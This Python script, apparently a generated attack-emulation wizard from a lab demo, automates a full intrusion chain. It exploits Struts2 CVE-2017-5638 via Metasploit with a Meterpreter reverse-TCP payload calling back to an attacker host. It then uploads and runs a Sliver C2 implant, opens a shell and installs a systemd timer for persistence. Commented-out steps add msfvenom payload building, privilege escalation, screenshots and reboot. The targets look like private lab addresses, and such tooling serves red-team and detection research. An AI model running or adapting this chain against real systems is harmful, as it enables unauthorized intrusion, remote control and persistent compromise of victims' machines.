import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/lexuswang/Aurora-executor-demo/config.ini")

    pddl_parameters = {}

    # Dictionary to track executors and their relationships
    # Each executor has: type, isDerivedExecutor, RealSessionID, parentExecutor
    executor_dict = {}

    # console.print(f"[bold cyan]\n📌[MSFVenom Console] Step 1[/]")
    # console.print(f"[bold cyan]\n📌[Name] Build the executable file of a Meterpreter session (for Linux) using MSFVenom[/]")

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: LHOST[/]")
    # console.print(f"  Description: IP address of the attacker machine")

    # default_val = None
    # required_val = True
    # user_input = console.input(
    #     f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val
    # if not user_input and True:
    #     raise ValueError("Missing required parameter: LHOST")
    # user_params["LHOST"] = user_input

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: LPORT[/]")
    # console.print(f"  Description: listening port of the attacter machine")

    # default_val = None
    # required_val = True
    # user_input = console.input(
    #     f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val
    # if not user_input and True:
    #     raise ValueError("Missing required parameter: LPORT")
    # user_params["LPORT"] = user_input

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    # console.print(f"  Description: Saved path of the generated payload")

    # default_val = None
    # required_val = True
    # user_input = console.input(
    #     f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val
    # if not user_input and True:
    #     raise ValueError("Missing required parameter: SAVE_PATH")
    # user_params["SAVE_PATH"] = user_input

    # confirm_action()

    # # MSFVenom command execution
    # console.print(f"[bold cyan]\n[MSFVenom Console] Generating payload...[/]")
    # msfvenom_command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={user_params["LHOST"]} LPORT={user_params["LPORT"]} -f elf -o {user_params["SAVE_PATH"]}/payload.elf"

    # import subprocess
    # try:
    #     result = subprocess.run(
    #         msfvenom_command,
    #         shell=True,
    #         capture_output=True,
    #         check=True
    #     )
    #     console.print(f"[bold green]✓ Payload generated successfully[/]")
    #     # Only print stderr if it exists (msfvenom writes info to stderr)
    #     if result.stderr:
    #         stderr_output = result.stderr.decode('utf-8', errors='ignore')
    #         console.print(stderr_output)
    # except subprocess.CalledProcessError as e:
    #     console.print(f"[bold red]✗ MSFVenom command failed: {str(e)}[/]")
    #     if e.stderr:
    #         stderr_output = e.stderr.decode('utf-8', errors='ignore')
    #         console.print(f"[red]{stderr_output}[/]")
    #     raise

    # print_finished_message("MSFVenom payload generated successfully!😊")

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 [/]")
    console.print(f"[bold cyan]\n📌[Name] Exploit a Struts2 Vulnerable Server (CVE-2017-5638 (S2-045)) [/]")

    from attack_executor.exploit.Metasploit import MetasploitExecutor
    metasploit_executor = MetasploitExecutor(config=config)

    # console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: LHOST[/]")
    # console.print(f"  Description: IP address of the attacker machine (listener)")
    # default_val = "None"
    # required_val = "False"
    # user_input = console.input(
    #     f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val

    # if not user_input and False:
    #     raise ValueError("Missing required parameter: LHOST")
    # user_params["LHOST"] = user_input

    # console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 2 Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: LPORT[/]")
    # console.print(f"  Description: Listening port for the reverse connection")
    # default_val = "None"
    # required_val = "False"
    # user_input = console.input(
    #     f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val

    # if not user_input and False:
    #     raise ValueError("Missing required parameter: LPORT")
    # user_params["LPORT"] = user_input

    # # Start Metasploit handler (listener)
    # with console.status("[bold green]Starting Metasploit handler..."):
    #     metasploit_executor.exploit_and_execute_payload(
    #         exploit_module_name="exploit/multi/handler",
    #         payload_module_name="linux/x64/meterpreter/reverse_tcp",
    #         LHOST=user_params["LHOST"], LPORT=user_params["LPORT"]
    # )
    # console.print("[bold green]✓ Handler started - waiting for victim to connect[/]")

    # console.print(f"[bold cyan]\n📌[Human] Step 3[/]")
    # console.print(f"[bold cyan]\n📌[Name] Simulate the victim download and execute malicious payload file[/]")

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: LHOST[/]")
    # console.print(f"  Description: IP address of the attacker machine")

    # default_val = None
    # required_val = True
    # user_input = console.input(
    #     f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val
    # if not user_input and True:
    #     raise ValueError("Missing required parameter: LHOST")
    # user_params["LHOST"] = user_input

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: LPORT[/]")
    # console.print(f"  Description: listening port of the attacter machine")

    # default_val = 8000
    # required_val = True
    # user_input = console.input(
    #     f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    # ) or default_val
    # if not user_input and True:
    #     raise ValueError("Missing required parameter: LPORT")
    # user_params["LPORT"] = user_input

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    # console.print(f"  Description: Saved path of the downloaded payload")

    # if "string0" in pddl_parameters:
    #     console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string0"]))
    #     user_params["SAVE_PATH"] = pddl_parameters["string0"]
    # else:
    #     default_val = None
    #     required_val = True
    #     user_input = console.input(
    #         f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
    #     ) or default_val
    #     if not user_input and True:
    #         raise ValueError("Missing required parameter: SAVE_PATH")
    #     user_params["SAVE_PATH"] = user_input
    #     pddl_parameters["string0"] = user_input

    # # Map PATH to already collected SAVE_PATH
    # user_params["PATH"] = user_params["SAVE_PATH"]
    # console.print(f"""\
    # (This step needs human interaction and (temporarily) cannot be executed automatically)
    # (On attacker's machine)
    # python -m http.server --port {user_params["LPORT"]}

    # (On victim's machine)
    # 1. Open {user_params["LHOST"]}:8000 in the browser
    # 2. Navigate to the path of the target payload file
    # 3. Download the payload file
    # 4. Execute the payload file to {user_params["PATH"]} (If on a Linux machine, you also need to chmod the file)

    # """)

    metasploit_executor.exploit_and_execute_payload(
        RHOSTS="172.30.0.14",
        TARGETURI="/struts2-showcase/integration/saveGangster.action",
        RPORT=8080,
        exploit_module_name="exploit/multi/http/struts2_content_type_ognl",
        payload_module_name="linux/x64/meterpreter/reverse_tcp",
        LHOST="172.30.0.11",
        LPORT="4444",
    )

    confirm_action()

    console.print(f"[bold cyan]\n📌[None] Step 2[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a Meterpreter Payload[/]")


    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 3[/]")
    console.print(f"[bold cyan]\n📌[Name] List Network Connections using Meterpreter[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["meterpreter_sessionid"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["meterpreter_sessionid"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Problem
    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: netstat[/]")
    confirm_action()
    try:
        metasploit_executor.netstat(executor_dict["executor0"]["RealSessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4[/]")
    console.print(f"[bold cyan]\n📌[Name] Get System Info using Meterpreter[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["meterpreter_sessionid"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        # Problem: Can use a function
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["meterpreter_sessionid"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Problem
    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: netstat[/]")
    confirm_action()
    try:
        metasploit_executor.sysinfo(executor_dict["executor0"]["RealSessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 5[/]")
    console.print(f"[bold cyan]\n📌[Name] List UID using Meterpreter[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["meterpreter_sessionid"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["meterpreter_sessionid"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Problem
    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: netstat[/]")
    confirm_action()
    try:
        metasploit_executor.getuid(executor_dict["executor0"]["RealSessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Console] Step 6[/]")
    console.print(f"[bold cyan]\n📌[Name] Build the Sliver implant payload (for Linux)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the C2 machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port for the Sliver session on the attacter machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: SAVE_PATH")
    user_params["SAVE_PATH"] = user_input

    # Execute in Sliver Console
    console.print(f"[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print(f"""\
    sliver > generate --mtls {user_params["LHOST"]}:{user_params["LPORT"]} --os linux --arch 64bit --save {user_params["SAVE_PATH"]}
    sliver > mtls --lport {user_params["LPORT"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Human] Step 7[/]")
    console.print(f"[bold cyan]\n📌[Name] Upload a file to the victim machine using Meterpreter[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the uploaded file")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["SAVE_PATH"] = pddl_parameters["string4"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string4"] = user_input

    # Map PATH to already collected SAVE_PATH
    user_params["PATH"] = user_params["SAVE_PATH"]
    metasploit_executor.upload("/home/lexuswang/sliver.elf", user_params["PATH"], meterpreter_sessionid = executor_dict["executor0"]["RealSessionID"])
    confirm_action()

    console.print(f"[bold cyan]\n📌[Human] Step 8[/]")
    console.print(f"[bold cyan]\n📌[Name] Chmod file using Meterpreter[/]")
    metasploit_executor.chmod(file_path=user_params["PATH"], mode="777", meterpreter_sessionid = executor_dict["executor0"]["RealSessionID"])
    confirm_action()
    
    console.print(f"[bold cyan]\n📌[Human] Step 9[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a file using Meterpreter[/]")
    metasploit_executor.execute(user_params["PATH"], meterpreter_sessionid = executor_dict["executor0"]["RealSessionID"])
    confirm_action()

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 10[/]")
    console.print(f"[bold cyan]\n📌[Name] Interactive Shell Access (Linux)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ParentSessionId[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["ParentSessionId"] = pddl_parameters["executor0"]
    else:
        default_val = ''
        required_val = False
        user_input = console.input(
            f"[bold]➤ Enter value for ParentSessionId (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and False:
            raise ValueError("Missing required parameter: ParentSessionId")
        user_params["ParentSessionId"] = user_input
        pddl_parameters["executor0"] = user_input

    # NewSessionID (executor1): Derived executor - implicit in the command execution
    # Description: The session ID of the derived shell.
    # Register as derived executor with parent: executor0
    # Get parent's session ID for the derived executor
    if "executor0" != "None" and "executor0" in executor_dict:
        parent_session_id = executor_dict["executor0"]["RealSessionID"]
        pddl_parameters["executor1"] = parent_session_id
    else:
        parent_session_id = user_params.get("SessionID", user_params.get("meterpreter_sessionid", ""))
        pddl_parameters["executor1"] = parent_session_id

    executor_dict["executor1"] = {
        "type": None,  # Type determined by command execution
        "isDerivedExecutor": True,
        "RealSessionID": parent_session_id,  # Use parent's session ID
        "parentExecutor": "executor0" if "executor0" != "None" else None
    }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: shell[/]")
    confirm_action()
    try:
        metasploit_executor.shell(executor_dict["executor0"]["RealSessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Bash Executor] Step 11[/]")
    console.print(f"[bold cyan]\n📌[Name] Create Systemd Service and Timer[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SessionID[/]")
    console.print(f"  Description: The ID of the Shell Executor")

    if "executor1" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor1"]))
        user_params["SessionID"] = pddl_parameters["executor1"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["SessionID"] = selected_session
        pddl_parameters["executor1"] = selected_session
        # Register in executor_dict as a Sliver executor
        executor_dict["executor1"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: path_to_systemd_service[/]")
    console.print(f"  Description: Path to systemd service unit file")

    default_val = '/etc/systemd/system/art-timer.service'
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for path_to_systemd_service (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: path_to_systemd_service")
    user_params["path_to_systemd_service"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: path_to_systemd_timer[/]")
    console.print(f"  Description: Path to service timer file")

    default_val = '/etc/systemd/system/art-timer.timer'
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for path_to_systemd_timer (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: path_to_systemd_timer")
    user_params["path_to_systemd_timer"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: systemd_service_name[/]")
    console.print(f"  Description: Name of systemd service")

    default_val = 'art-timer.service'
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for systemd_service_name (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: systemd_service_name")
    user_params["systemd_service_name"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: systemd_timer_name[/]")
    console.print(f"  Description: Name of systemd service timer")

    default_val = 'art-timer.timer'
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for systemd_timer_name (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: systemd_timer_name")
    user_params["systemd_timer_name"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: COMMAND[/]")
    console.print(f"  Description: Name of the file path")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["COMMAND"] = pddl_parameters["string4"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for COMMAND (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: COMMAND")
        user_params["COMMAND"] = user_input
        pddl_parameters["string4"] = user_input

    confirm_action()
    commands = f"""
    echo "[Unit]" > {user_params["path_to_systemd_service"]}\necho "Description=Atomic Red Team Systemd Timer Service" >> {user_params["path_to_systemd_service"]}\necho "[Service]" >> {user_params["path_to_systemd_service"]}\necho "Type=simple" >> {user_params["path_to_systemd_service"]}\necho "ExecStart={user_params["COMMAND"]}" >> {user_params["path_to_systemd_service"]}\necho "[Install]" >> {user_params["path_to_systemd_service"]}\necho "WantedBy=multi-user.target" >> {user_params["path_to_systemd_service"]}\necho "[Unit]" > {user_params["path_to_systemd_timer"]}\necho "Description=Executes Atomic Red Team Systemd Timer Service" >> {user_params["path_to_systemd_timer"]}\necho "Requires={user_params["systemd_service_name"]}" >> {user_params["path_to_systemd_timer"]}\necho "[Timer]" >> {user_params["path_to_systemd_timer"]}\necho "Unit={user_params["systemd_service_name"]}" >> {user_params["path_to_systemd_timer"]}\necho "OnCalendar=*-*-* *:*:00" >> {user_params["path_to_systemd_timer"]}\necho "[Install]" >> {user_params["path_to_systemd_timer"]}\necho "WantedBy=timers.target" >> {user_params["path_to_systemd_timer"]}\nsystemctl start {user_params["systemd_timer_name"]}\nsystemctl enable {user_params["systemd_timer_name"]}\nsystemctl daemon-reload
    """
    metasploit_executor.communicate_with_msf_session(input_texts=commands, session_id=executor_dict["executor1"]["RealSessionID"])

    print_finished_message()

    console.print(f"[bold cyan]\n📌[None] Step 12[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a file with a command executor[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: path[/]")
    console.print(f"  Description: The path of the sliver implant payload file")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["path"] = pddl_parameters["string4"]
    else:
        default_val = None
        required_val = False
        user_input = console.input(
            f"[bold]➤ Enter value for path (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and False:
            raise ValueError("Missing required parameter: path")
        user_params["path"] = user_input
        pddl_parameters["string4"] = user_input


    console.print(f"[bold cyan]\n📌[None] Step 13[/]")
    console.print(f"[bold cyan]\n📌[Name] Obtain a persistent Sliver Executor[/]")


    # console.print(f"[bold cyan]\n📌[Human] Step 12[/]")
    # console.print(f"[bold cyan]\n📌[Name] Simulate the victim download and execute malicious payload file as Root[/]")

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: path[/]")
    # console.print(f"  Description: The path of the file to be executed")

    # if "string0" in pddl_parameters:
    #     console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string0"]))
    #     user_params["path"] = pddl_parameters["string0"]
    # else:
    #     default_val = None
    #     required_val = True
    #     user_input = console.input(
    #         f"[bold]➤ Enter value for path (default: {default_val}, required: {required_val}): [/]"
    #     ) or default_val
    #     if not user_input and True:
    #         raise ValueError("Missing required parameter: path")
    #     user_params["path"] = user_input
    #     pddl_parameters["string0"] = user_input
    # console.print(f"""\
    # (This step needs human interaction and (temporarily) cannot be executed automatically)
    # (On victim's machine)
    # 1. Open a terminal
    # 2. Run sudo {user_params["path"]} 
    # 3. Type the passwords (if necessary)

    # """)

    # confirm_action()

    # # Privilege escalation detected, prompt user to re-select the new session
    # console.print("[bold yellow]Privilege escalation step detected. Please select the new, elevated session that has connected.[/bold yellow]")
    # # Initialize Sliver executor if not already done
    # if 'sliver_executor' not in dir():
    #     from attack_executor.post_exploit.Sliver import SliverExecutor
    #     sliver_executor = SliverExecutor(config=config)
    # selected_session = await sliver_executor.select_sessions()
    # user_params["SessionID"] = selected_session
    # pddl_parameters["executor4"] = selected_session
    # executor_dict["executor4"] = {
    #     "type": "Sliver Executor",
    #     "isDerivedExecutor": False,
    #     "RealSessionID": selected_session,
    #     "parentExecutor": None
    # }

    # console.print(f"[bold cyan]\n📌[None] Step 13[/]")
    # console.print(f"[bold cyan]\n📌[Name] Execute a Meterpreter Payload[/]")


    # console.print(f"[bold cyan]\n📌[Sliver Executor] Step 14[/]")
    # console.print(f"[bold cyan]\n📌[Name] Take Screenshot[/]")

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: SessionID[/]")
    # console.print(f"  Description: The session ID of the active Sliver connection.")

    # if "executor4" in pddl_parameters:
    #     console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor4"]))
    #     user_params["SessionID"] = pddl_parameters["executor4"]
    # else:
    #     # Initialize Sliver executor if not already done
    #     if 'sliver_executor' not in dir():
    #         from attack_executor.post_exploit.Sliver import SliverExecutor
    #         sliver_executor = SliverExecutor(config=config)

    #     console.print(f"[bold cyan]  Select from available sessions:[/]")
    #     selected_session = await sliver_executor.select_sessions()
    #     user_params["SessionID"] = selected_session
    #     pddl_parameters["executor4"] = selected_session
    #     # Register in executor_dict as a Sliver executor
    #     executor_dict["executor4"] = {
    #         "type": "Sliver Executor",
    #         "isDerivedExecutor": False,
    #         "RealSessionID": selected_session,
    #         "parentExecutor": None
    #     }

    # from attack_executor.post_exploit.Sliver import SliverExecutor
    # sliver_executor = SliverExecutor(config=config)

    # # Sliver command execution
    # console.print(f"[bold cyan]\n[Sliver Executor] Executing: screenshot[/]")
    # confirm_action()
    # try:
    #     await sliver_executor.screenshot(executor_dict["executor4"]["RealSessionID"])
    # except Exception as e:
    #     console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
    #     raise

    # console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 15[/]")
    # console.print(f"[bold cyan]\n📌[Name] System Reboot[/]")

    # console.print(f"[bold cyan] Parameter Input[/]")
    # console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    # console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    # if "executor0" in pddl_parameters:
    #     console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
    #     user_params["meterpreter_sessionid"] = pddl_parameters["executor0"]
    # else:
    #     # Initialize Metasploit executor if not already done
    #     if 'metasploit_executor' not in dir():
    #         from attack_executor.exploit.Metasploit import MetasploitExecutor
    #         metasploit_executor = MetasploitExecutor(config=config)

    #     console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
    #     selected_session = metasploit_executor.select_meterpreter_session()
    #     user_params["meterpreter_sessionid"] = selected_session
    #     pddl_parameters["executor0"] = selected_session
    #     metasploit_sessionid = selected_session
    #     # Register in executor_dict as a primary Meterpreter executor
    #     executor_dict["executor0"] = {
    #         "type": "Meterpreter Executor",
    #         "isDerivedExecutor": False,
    #         "RealSessionID": selected_session,
    #         "parentExecutor": None
    #     }

    # user_params["meterpreter_sessionid"] = metasploit_sessionid

    # # Meterpreter command execution
    # console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: reboot[/]")
    # confirm_action()
    # try:
    #     metasploit_executor.reboot(executor_dict["executor0"]["RealSessionID"])
    # except Exception as e:
    #     console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
    #     raise

if __name__ == "__main__":
    asyncio.run(main())